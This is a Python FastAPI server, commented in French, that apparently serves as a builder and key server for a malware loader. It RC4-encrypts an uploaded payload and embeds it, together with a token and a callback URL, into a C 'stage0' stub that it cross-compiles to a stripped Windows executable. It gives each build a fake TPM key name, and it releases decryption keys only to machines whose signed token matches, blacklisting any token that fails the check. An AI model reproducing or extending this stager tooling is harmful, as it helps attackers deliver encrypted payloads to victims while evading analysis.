from typing import Annotated, Optional
from contextlib import asynccontextmanager
from fastapi import Depends, FastAPI, HTTPException, Query, Request, UploadFile, File, Form
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from sqlmodel import Session, create_engine, select, SQLModel
from models.models import Token, TokenCreate
import secrets
import base64
import os
import shutil
import subprocess
from datetime import datetime
from fastapi.responses import FileResponse
import json
import random
import platform

# Configuration de la base de données
DB_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data")
os.makedirs(DB_DIR, exist_ok=True)
sqlite_file_name = os.path.join(DB_DIR, "database.db")
sqlite_url = f"sqlite:///{sqlite_file_name}"

connect_args = {"check_same_thread": False}
engine = create_engine(sqlite_url, connect_args=connect_args)


def create_db_and_tables():
    """
    Creates all database tables defined in SQLModel metadata.
    This function is called during application startup.
    """
    SQLModel.metadata.create_all(engine)  # Crée les tables si elles n'existent pas


def get_session():
    """
    Dependency function that provides a database session.
    Yields a session and ensures it's properly closed after use.
    """
    with Session(engine) as session:
        yield session

@asynccontextmanager
async def lifespan(app: FastAPI):
    """
    Gestion du cycle de vie de l'application.
    """
    # Créer les dossiers nécessaires
    create_db_and_tables()
    
    # Créer le dossier temp s'il n'existe pas
    temp_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "temp")
    os.makedirs(temp_dir, exist_ok=True)
    print(f"\n[+] Dossier temp créé/vérifié: {temp_dir}")
    
    yield


SessionDep = Annotated[Session, Depends(get_session)]

app = FastAPI(lifespan=lifespan)

# Configuration des fichiers statiques et templates
app.mount("/static", StaticFiles(directory="Server/app/static"), name="static")
templates = Jinja2Templates(directory="Server/app/templates")

def generate_stage0_token() -> str:
    """
    Génère un token qui peut se fondre dans un binaire.
    Utilise un format qui ressemble à un UUID ou un hash.
    """
    # Génère 16 bytes aléatoires et les encode en hexadécimal
    random_bytes = secrets.token_bytes(16)
    return random_bytes.hex()

def generate_decryption_key() -> str:
    """
    Génère une clé de déchiffrement robuste (32 bytes = 256 bits).
    """
    # Génère 32 bytes aléatoires et les encode en base64
    key_bytes = secrets.token_bytes(32)
    return base64.b64encode(key_bytes).decode('utf-8')

def generate_stage0_c(token: str, payload: bytes, tpmKeyName: str = None) -> str:
    """
    Génère le code C du stage0 avec le token et la charge utile.
    """
    # Lire le template
    template_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "temp", "stage0_template.c")
    with open(template_path, 'r') as f:
        template = f.read()
    
    # Convertir la charge utile en format C
    payload_c = ', '.join([f'0x{b:02x}' for b in payload])
    
    # Récupérer la clé de déchiffrement depuis la base de données
    with Session(engine) as session:
        db_token = session.exec(select(Token).where(Token.token == token)).first()
        if not db_token or not db_token.decryptionKey:
            raise ValueError("Token not found or no decryption key available")
        decryption_key = db_token.decryptionKey
    
    # Lire la configuration du serveur
    config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "server_config.json")
    try:
        with open(config_path, "r") as f:
            config = json.load(f)
            server_url = config.get("serverUrl", "http://127.0.0.1:8000/")
    except Exception as e:
        print(f"[!] Erreur lors de la lecture de la configuration: {str(e)}")
        server_url = "http://127.0.0.1:8000/"
    
    print(f"[+] Utilisation de l'URL du serveur: {server_url}")
    
    # Remplacer les placeholders
    code = template.replace('{{TOKEN}}', token)
    code = code.replace('{{PAYLOAD}}', payload_c)
    code = code.replace('{{DECRYPTION_KEY}}', decryption_key)
    code = code.replace('{{SERVER_URL}}', server_url)
    
    # Remplacer le nom de la clé TPM si fourni
    if tpmKeyName:
        code = code.replace('{{KEY_NAME}}', tpmKeyName)
    else:
        # Générer un nom de clé TPM aléatoire qui semble réaliste
        tpm_key_prefixes = ["RSA", "ECC", "AES", "HMAC"]
        tpm_key_suffix = secrets.token_hex(4).upper()
        tpm_key_name = f"TPM2_{random.choice(tpm_key_prefixes)}_{tpm_key_suffix}"
        code = code.replace('{{KEY_NAME}}', tpm_key_name)
    
    # Créer un dossier unique pour ce stage0
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    stage0_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "temp", f"stage0_{timestamp}")
    os.makedirs(stage0_dir, exist_ok=True)
    
    # Sauvegarder le fichier C
    output_path = os.path.join(stage0_dir, "stage0.c")
    with open(output_path, 'w') as f:
        f.write(code)
    
    return output_path

def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """
    Chiffre les données avec l'algorithme RC4.
    
    Args:
        data (bytes): Les données à chiffrer
        key (bytes): La clé de chiffrement
        
    Returns:
        bytes: Les données chiffrées
    """
    # Initialisation du tableau S
    S = list(range(256))
    j = 0
    
    # Key-scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # Pseudo-random generation algorithm (PRGA)
    i = j = 0
    result = bytearray()
    
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    
    return bytes(result)

def compile_stage0(c_file_path: str, debug_mode: bool = False) -> tuple[bool, str, str]:
    """
    Compile le fichier C en exécutable Windows.
    
    Args:
        c_file_path (str): Chemin vers le fichier C à compiler
        debug_mode (bool): Active le mode debug dans le binaire
        
    Returns:
        tuple[bool, str, str]: (succès, message d'erreur ou chemin de l'exécutable, logs de compilation)
    """
    try:
        # Détecter l'OS
        system = platform.system()
        if system == "Windows":
            compiler = "gcc"
        else:
            compiler = "x86_64-w64-mingw32-gcc"  # MinGW cross-compiler for Linux

        # Vérifier si le compilateur est disponible
        try:
            gcc_version = subprocess.run([compiler, '--version'], capture_output=True, text=True, check=True)
            print(f"\n[+] Compilateur {compiler} détecté:\n{gcc_version.stdout}")
        except (subprocess.SubprocessError, FileNotFoundError):
            return False, f"Le compilateur {compiler} n'est pas installé. Veuillez l'installer.", ""

        # Préparer les chemins
        output_dir = os.path.dirname(c_file_path)
        exe_path = os.path.join(output_dir, "stage0.exe")
        
        # Options de compilation pour une application Windows sans console
        compile_args = [
            compiler,
            c_file_path,
            '-o', exe_path,
            '-O2',
            '-s',
            '-static',
            '-lwinhttp',  # Lier avec WinHTTP
            '-lws2_32',   # Lier avec Winsock2
            '-ladvapi32', # Lier avec Advapi32
            '-lkernel32', # Lier avec Kernel32
            '-lncrypt',   # Lier avec Ncrypt
        ]
        
        # Ajouter le flag de debug si nécessaire
        if debug_mode:
            compile_args.insert(1, "-DDEBUG=1")
            print("[*] Mode debug activé")
        
        print(f"\n[+] Compilation du stage0:")
        print(f"[*] Fichier source: {c_file_path}")
        print(f"[*] Fichier de sortie: {exe_path}")
        print(f"[*] Options de compilation: {' '.join(compile_args)}")
        
        # Compiler
        result = subprocess.run(
            compile_args,
            capture_output=True,
            text=True
        )
        
        # Afficher les logs de compilation
        if result.stdout:
            print("\n[+] Sortie standard:")
            print(result.stdout)
        if result.stderr:
            print("\n[!] Erreurs/Avertissements:")
            print(result.stderr)
        
        if result.returncode != 0:
            return False, f"Erreur de compilation: {result.stderr}", result.stderr
        
        # Vérifier la taille de l'exécutable
        exe_size = os.path.getsize(exe_path)
        print(f"\n[+] Compilation réussie!")
        print(f"[*] Taille de l'exécutable: {exe_size / 1024:.2f} KB")
        
        return True, exe_path, result.stdout + result.stderr
        
    except Exception as e:
        error_msg = f"Erreur lors de la compilation: {str(e)}"
        print(f"\n[!] {error_msg}")
        return False, error_msg, str(e)

@app.post("/stage0/create")
async def create_stage0(
    session: SessionDep,
    payload: UploadFile = File(...),
    tpmKeyName: str = Form(None),
    debugMode: bool = Form(False)
) -> dict:
    """
    Crée un nouveau stage0 avec un token et une clé de déchiffrement.
    
    Args:
        session: Session de base de données
        payload: Le fichier binaire de la charge utile
        tpmKeyName: Le nom de la clé TPM à utiliser
        debugMode: Active le mode debug dans le stage0
        
    Returns:
        dict: Contient le token, la clé de déchiffrement et le chemin du stage0
    """
    # Générer le token et la clé
    token = generate_stage0_token()
    decryption_key = generate_decryption_key()
    
    # Lire la charge utile
    payload_content = await payload.read()
    
    # Afficher les informations de débogage
    print(f"\n[+] Informations de débogage:")
    print(f"[*] Taille de la charge utile: {len(payload_content)} bytes")
    print(f"[*] Clé de déchiffrement (base64): {decryption_key}")
    if tpmKeyName:
        print(f"[*] Nom de la clé TPM: {tpmKeyName}")
    print(f"[*] Mode debug: {'Activé' if debugMode else 'Désactivé'}")
    
    # Convertir la clé de base64 en bytes
    key_bytes = base64.b64decode(decryption_key)
    print(f"[*] Clé de déchiffrement (bytes): {key_bytes.hex()}")
    
    # Chiffrer la charge utile avec RC4
    encrypted_payload = rc4_encrypt(payload_content, key_bytes)
    print(f"[*] Taille de la charge utile chiffrée: {len(encrypted_payload)} bytes")
    print(f"[*] Premiers octets chiffrés: {encrypted_payload[:16].hex()}")
    
    # Créer le token dans la base de données
    db_token = Token(token=token, decryptionKey=decryption_key)
    session.add(db_token)
    session.commit()
    session.refresh(db_token)
    
    # Créer le dossier de sortie pour ce stage0
    base_dir = os.path.dirname(os.path.dirname(__file__))
    output_dir = os.path.join(base_dir, "temp", f"stage0_{token}")
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"\n[+] Création du stage0:")
    print(f"[*] Base directory: {base_dir}")
    print(f"[*] Output directory: {output_dir}")
    
    # Générer le stage0 avec la charge utile chiffrée
    stage0_c_path = generate_stage0_c(token, encrypted_payload, tpmKeyName)
    
    # Compiler le stage0 avec le mode debug si activé
    success, result, logs = compile_stage0(stage0_c_path, debugMode)
    if not success:
        raise HTTPException(status_code=500, detail=f"Erreur de compilation: {result}")
    
    # Copier l'exécutable dans le dossier de sortie
    exe_path = os.path.join(output_dir, "stage0.exe")
    print(f"[*] Copie de l'exécutable vers: {exe_path}")
    shutil.copy2(result, exe_path)
    
    # Vérifier que le fichier a bien été copié
    if not os.path.exists(exe_path):
        print(f"[!] Erreur: Le fichier n'a pas été copié correctement")
        raise HTTPException(status_code=500, detail="Erreur lors de la copie du stage0")
    
    print(f"[+] Stage0 créé avec succès")
    
    return {
        "token": token,
        "decryptionKey": decryption_key,
        "id": db_token.id,
        "stage0Path": exe_path,
        "compilationLogs": logs,
        "debugMode": debugMode
    }

@app.post("/tokens/")
def create_token(token_data: TokenCreate, session: SessionDep) -> Token:
    """
    Create a new token in the database.
    
    Args:
        token_data (TokenCreate): The token data containing the token string
        session (SessionDep): Database session dependency
        
    Returns:
        Token: The created token object
    """
    token = Token(token=token_data.token)
    session.add(token)
    session.commit()
    session.refresh(token)
    return token

@app.post("/tokens/register")
async def register_token(
    session: SessionDep,
    token: str = Query(...),
    signedToken: str = Query(...)
) -> dict:
    """
    Enregistre un token signé.
    
    Args:
        session: Session de base de données
        token: Le token à enregistrer
        signedToken: La signature du token
        
    Returns:
        dict: Message de succès ou d'erreur
    """
    # Vérifier si le token existe déjà
    db_token = session.exec(select(Token).where(Token.token == token)).first()
    if not db_token:
        return { "error": "Token not found" }
        
    if db_token.signedToken:
        if db_token.signedToken != signedToken:
            db_token.isBlacklisted = True
            session.add(db_token)
            session.commit()
            return { "error": "Invalid system configuration" }
        return { "detail": "Token is already signed" }
        
    # Mettre à jour le token signé
    db_token.signedToken = signedToken
    session.add(db_token)
    session.commit()
    
    return {"detail": "Token registered successfully"}

@app.post("/verify")
async def verify_token(
    session: SessionDep,
    token: str = Query(...),
    signedToken: str = Query(...)
) -> dict:
    """
    Vérifie un token signé et retourne la clé de déchiffrement.
    
    Args:
        session: Session de base de données
        token: Le token à vérifier
        signedToken: La signature du token
        
    Returns:
        dict: La clé de déchiffrement si la vérification réussit
    """
    # Trouver le token
    db_token = session.exec(select(Token).where(Token.token == token)).first()
    if not db_token:
        return { "error": "Token not found" }
    
    # Vérifier si le token est blacklisté
    if db_token.isBlacklisted:
        return { "error": "Token is blacklisted" }
    
    # Vérifier si le token est déjà signé
    if db_token.signedToken:
        if db_token.signedToken != signedToken:
            # Blacklist le token si la signature ne correspond pas
            db_token.isBlacklisted = True
            session.add(db_token)
            session.commit()
            return { "error": "Invalid signature" }
    
    return {"decryptionKey": db_token.decryptionKey}

@app.get("/tokens/")
def read_tokens(
    session: SessionDep,
    offset: int = 0,
    limit: Annotated[int, Query(le=100)] = 100,
    sort_by: str = Query("createdAt", description="Champ de tri (createdAt, token, isBlacklisted)"),
    order: str = Query("desc", description="Ordre de tri (asc ou desc)"),
    created_after: Optional[datetime] = Query(None, description="Filtrer les tokens créés après cette date"),
    created_before: Optional[datetime] = Query(None, description="Filtrer les tokens créés avant cette date")
) -> list[dict]:
    """
    Retrieve a list of tokens with pagination, sorting and filtering.
    
    Args:
        session (SessionDep): Database session dependency
        offset (int): Number of records to skip
        limit (int): Maximum number of records to return (max 100)
        sort_by (str): Field to sort by (createdAt, token, isBlacklisted)
        order (str): Sort order (asc or desc)
        created_after (datetime): Filter tokens created after this date
        created_before (datetime): Filter tokens created before this date
        
    Returns:
        list[dict]: List of token objects with registration status and creation date
    """
    # Construire la requête de base
    query = select(Token)
    
    # Appliquer les filtres de date
    if created_after:
        query = query.where(Token.createdAt >= created_after)
    if created_before:
        query = query.where(Token.createdAt <= created_before)
    
    # Appliquer le tri
    if sort_by == "createdAt":
        sort_field = Token.createdAt
    elif sort_by == "token":
        sort_field = Token.token
    elif sort_by == "isBlacklisted":
        sort_field = Token.isBlacklisted
    else:
        sort_field = Token.createdAt
    
    if order.lower() == "asc":
        query = query.order_by(sort_field)
    else:
        query = query.order_by(sort_field.desc())
    
    # Appliquer la pagination
    query = query.offset(offset).limit(limit)
    
    # Exécuter la requête
    tokens = session.exec(query).all()
    
    # Formater la réponse
    return [{
        "id": token.id,
        "token": token.token,
        "signedToken": token.signedToken,
        "isBlacklisted": token.isBlacklisted,
        "decryptionKey": token.decryptionKey,
        "isRegistered": token.signedToken is not None,
        "registrationDate": token.signedToken is not None,
        "createdAt": token.createdAt.isoformat() if token.createdAt else None,
        "age": (datetime.utcnow() - token.createdAt).total_seconds() / 3600 if token.createdAt else None  # Âge en heures
    } for token in tokens]

@app.get("/tokens/stats")
def get_token_stats(session: SessionDep) -> dict:
    """
    Récupère des statistiques sur les tokens.
    
    Args:
        session (SessionDep): Session de base de données
        
    Returns:
        dict: Statistiques sur les tokens
    """
    # Récupérer tous les tokens
    tokens = session.exec(select(Token)).all()
    
    # Calculer les statistiques
    total_tokens = len(tokens)
    blacklisted_tokens = len([t for t in tokens if t.isBlacklisted])
    registered_tokens = len([t for t in tokens if t.signedToken])
    
    # Calculer l'âge moyen des tokens
    if tokens:
        now = datetime.utcnow()
        avg_age = sum((now - t.createdAt).total_seconds() for t in tokens) / len(tokens) / 3600  # en heures
    else:
        avg_age = 0
    
    # Calculer la distribution des tokens par jour
    tokens_by_day = {}
    for token in tokens:
        day = token.createdAt.date().isoformat()
        tokens_by_day[day] = tokens_by_day.get(day, 0) + 1
    
    return {
        "total_tokens": total_tokens,
        "blacklisted_tokens": blacklisted_tokens,
        "registered_tokens": registered_tokens,
        "average_token_age_hours": round(avg_age, 2),
        "tokens_by_day": tokens_by_day
    }

@app.get("/tokens/{token_id}")
def read_token(token_id: int, session: SessionDep) -> Token:
    """
    Retrieve a specific token by its ID.
    
    Args:
        token_id (int): The ID of the token to retrieve
        session (SessionDep): Database session dependency
        
    Returns:
        Token: The requested token object
        
    Raises:
        HTTPException: If token is not found
    """
    token = session.get(Token, token_id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    return token

@app.delete("/tokens/{token_id}")
def delete_token(token_id: int, session: SessionDep):
    """
    Delete a token by its ID and its associated stage0 directory.
    
    Args:
        token_id (int): The ID of the token to delete
        session (SessionDep): Database session dependency
        
    Returns:
        dict: {"ok": True} if deletion was successful
        
    Raises:
        HTTPException: If token is not found
    """
    token = session.get(Token, token_id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    
    # Supprimer le dossier du stage0 s'il existe
    base_dir = os.path.dirname(os.path.dirname(__file__))
    stage0_dir = os.path.join(base_dir, "temp", f"stage0_{token.token}")
    if os.path.exists(stage0_dir):
        try:
            shutil.rmtree(stage0_dir)
            print(f"[+] Dossier stage0 supprimé: {stage0_dir}")
        except Exception as e:
            print(f"[!] Erreur lors de la suppression du dossier stage0: {str(e)}")
    
    # Supprimer le dossier temporaire contenant le code C s'il existe
    temp_c_dir = os.path.join(base_dir, "temp", f"stage0_{token.token}_c")
    if os.path.exists(temp_c_dir):
        try:
            shutil.rmtree(temp_c_dir)
            print(f"[+] Dossier temporaire C supprimé: {temp_c_dir}")
        except Exception as e:
            print(f"[!] Erreur lors de la suppression du dossier temporaire C: {str(e)}")
    
    # Supprimer le token de la base de données
    session.delete(token)
    session.commit()
    return {"ok": True}

@app.put("/tokens/{token_id}/blacklist")
def blacklist_token(token_id: int, session: SessionDep):
    """
    Blacklist a specific token by its ID.
    
    Args:
        token_id (int): The ID of the token to blacklist
        session (SessionDep): Database session dependency
        
    Returns:
        Token: The updated token object
        
    Raises:
        HTTPException: If token is not found
    """
    token = session.get(Token, token_id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    if token.isBlacklisted:
        raise HTTPException(status_code=400, detail="Token is already blacklisted")
    token.isBlacklisted = True
    session.add(token)
    session.commit()
    session.refresh(token)
    return token

@app.post("/tokens/{token_id}/decryption-key")
def set_decryption_key(token_id: int, decryptionKey: str, session: SessionDep) -> Token:
    """
    Définit la clé de déchiffrement pour un token spécifique.
    
    Args:
        token_id (int): L'ID du token
        decryptionKey (str): La clé de déchiffrement à stocker
        session (SessionDep): Session de base de données
        
    Returns:
        Token: Le token mis à jour
        
    Raises:
        HTTPException: Si le token n'est pas trouvé ou n'est pas enregistré
    """
    token = session.get(Token, token_id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    if not token.signedToken:
        raise HTTPException(status_code=400, detail="Token must be registered before setting decryption key")
    token.decryptionKey = decryptionKey
    session.add(token)
    session.commit()
    session.refresh(token)
    return token

@app.put("/tokens/{token_id}/unblacklist")
def unblacklist_token(token_id: int, session: SessionDep):
    """
    Retire un token de la blacklist.
    
    Args:
        token_id (int): L'ID du token à retirer de la blacklist
        session (SessionDep): Session de base de données
        
    Returns:
        Token: Le token mis à jour
        
    Raises:
        HTTPException: Si le token n'est pas trouvé ou n'est pas blacklisté
    """
    token = session.get(Token, token_id)
    if not token:
        raise HTTPException(status_code=404, detail="Token not found")
    if not token.isBlacklisted:
        raise HTTPException(status_code=400, detail="Token is not blacklisted")
    token.isBlacklisted = False
    session.add(token)
    session.commit()
    session.refresh(token)
    return token

@app.get("/")
async def read_root(request: Request):
    """
    Affiche la page d'accueil avec l'interface de gestion des tokens.
    """
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/download_stage0/{token}")
async def download_stage0(token: str, session: SessionDep):
    # Vérifier si le token existe dans la base de données
    db_token = session.exec(select(Token).where(Token.token == token)).first()
    if not db_token:
        raise HTTPException(status_code=404, detail="Token non trouvé")
    
    # Chemin vers le fichier stage0.exe dans le dossier de sortie
    base_dir = os.path.dirname(os.path.dirname(__file__))
    stage0_dir = os.path.join(base_dir, "temp", f"stage0_{token}")
    stage0_path = os.path.join(stage0_dir, "stage0.exe")
    
    print(f"\n[+] Recherche du stage0:")
    print(f"[*] Base directory: {base_dir}")
    print(f"[*] Stage0 directory: {stage0_dir}")
    print(f"[*] Stage0 path: {stage0_path}")
    
    # Vérifier si le dossier existe
    if not os.path.exists(stage0_dir):
        print(f"[!] Le dossier {stage0_dir} n'existe pas")
        raise HTTPException(status_code=404, detail="Dossier stage0 non trouvé")
    
    # Vérifier si le fichier existe
    if not os.path.exists(stage0_path):
        print(f"[!] Le fichier {stage0_path} n'existe pas")
        # Lister le contenu du dossier pour debug
        print(f"[*] Contenu du dossier {stage0_dir}:")
        try:
            for file in os.listdir(stage0_dir):
                print(f"    - {file}")
        except Exception as e:
            print(f"    Erreur lors de la lecture du dossier: {str(e)}")
        raise HTTPException(status_code=404, detail="Stage0 non trouvé")
    
    print(f"[+] Stage0 trouvé, envoi du fichier...")
    
    # Retourner le fichier
    return FileResponse(
        stage0_path,
        media_type="application/octet-stream",
        filename=f"stage0_{token}.exe"
    )

@app.get("/config")
async def get_config():
    """
    Récupère la configuration du serveur.
    """
    try:
        print(f"\n[+] Tentative de lecture de la configuration")
        config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "server_config.json")
        print(f"[*] Chemin du fichier de configuration: {config_path}")
        
        if not os.path.exists(config_path):
            print(f"[!] Le fichier de configuration n'existe pas, création avec les valeurs par défaut")
            default_config = {"serverUrl": "http://127.0.0.1:8000/"}
            os.makedirs(os.path.dirname(config_path), exist_ok=True)
            with open(config_path, "w") as f:
                json.dump(default_config, f, indent=4)
            return default_config
        
        with open(config_path, "r") as f:
            config = json.load(f)
            # Si l'URL n'est pas définie, utiliser la valeur par défaut
            if not config.get("serverUrl"):
                config["serverUrl"] = "http://127.0.0.1:8000/"
                # Sauvegarder la configuration mise à jour
                with open(config_path, "w") as f:
                    json.dump(config, f, indent=4)
            print(f"[+] Configuration lue avec succès: {config}")
            return config
    except Exception as e:
        print(f"[!] Erreur lors de la lecture de la configuration: {str(e)}")
        # En cas d'erreur, retourner la configuration par défaut
        return {"serverUrl": "http://127.0.0.1:8000/"}

@app.post("/config")
async def update_config(config: dict):
    """
    Met à jour la configuration du serveur.
    """
    try:
        print(f"\n[+] Tentative de mise à jour de la configuration")
        print(f"[*] Configuration reçue: {config}")
        
        # Valider l'URL
        if not config.get("serverUrl"):
            print("[!] L'URL du serveur est manquante")
            raise HTTPException(status_code=400, detail="L'URL du serveur est requise")
        
        # Valider le format de l'URL
        if not config["serverUrl"].startswith("http://"):
            print("[!] L'URL doit commencer par http://")
            raise HTTPException(status_code=400, detail="L'URL doit commencer par http://")
        
        # Sauvegarder la configuration
        config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "server_config.json")
        print(f"[*] Sauvegarde dans: {config_path}")
        
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        with open(config_path, "w") as f:
            json.dump(config, f, indent=4)
        
        print("[+] Configuration sauvegardée avec succès")
        return {"message": "Configuration mise à jour avec succès"}
    except Exception as e:
        print(f"[!] Erreur lors de la mise à jour de la configuration: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
